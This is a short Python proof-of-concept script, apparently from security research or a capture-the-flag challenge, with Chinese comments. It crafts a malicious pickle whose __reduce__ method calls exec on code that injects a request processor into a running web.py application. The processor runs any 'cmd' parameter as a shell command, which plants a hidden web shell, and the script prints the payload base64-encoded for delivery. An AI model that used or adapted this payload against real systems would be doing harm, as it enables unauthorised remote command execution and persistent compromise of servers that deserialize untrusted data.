import pickle
import os
import base64

class genpoc(object):
    def __reduce__(self):
        s = """import sys
def hello(handler): 
        import subprocess
        params = web.input()
        cmd = params.cmd
        output = subprocess.check_output(cmd, shell=True).decode('utf-8')
        return output
app = sys.modules['__main__'].__dict__['app']
app.add_processor(hello)



"""
        return exec, (s,)        # reduce函数必须返回元组或字符串

e = genpoc()
poc = pickle.dumps(e)

print(base64.b64encode(poc).decode()) # 此时，如果 pickle.loads(poc)，就会执行命令
# pickle.loads(poc)
